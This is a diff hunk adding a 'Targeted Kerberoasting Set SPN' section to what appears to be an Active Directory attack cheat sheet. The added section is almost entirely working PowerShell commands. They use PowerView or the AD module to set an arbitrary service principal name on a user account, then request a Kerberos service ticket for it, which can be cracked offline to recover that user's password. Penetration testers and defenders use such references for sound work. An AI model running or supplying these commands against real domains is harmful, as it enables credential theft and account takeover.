@@ -426,3 +426,25 @@ Get-ASREPHash -UserName VPN1user -Verbose
 ```
 
 ### Targeted Kerberoasting Set SPN
+
+**1. With Powerview dev Version:**
+```powershell
+# Check if user01 already has a SPN
+Get-DomainUser -Identity User01 | select serviceprincipalname
+# Set a SPN for the user
+Set-DomainObject -Identity User01 -Set @{serviceprincipalname='ops/whatever1'}
+```
+**2. With AD Module:**
+```powershell
+# Check if user01 already has a SPN
+Get-ADUser -Identity User01 -Properties serviceprincipalname | select serviceprincipalname
+# Set a SPN for the user
+Set-ADUser -Identity User01 -ServicePrincipalNames @{Add='ops/whatever1'}
+```
+**3. Request a ticket:**
+```powershell
+# Step 1 - Request a ticket
+Add-Type -AssemblyNAme System.IdentityModel
+# Step 2 - Request a ticket
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ops/whatever1"
+```
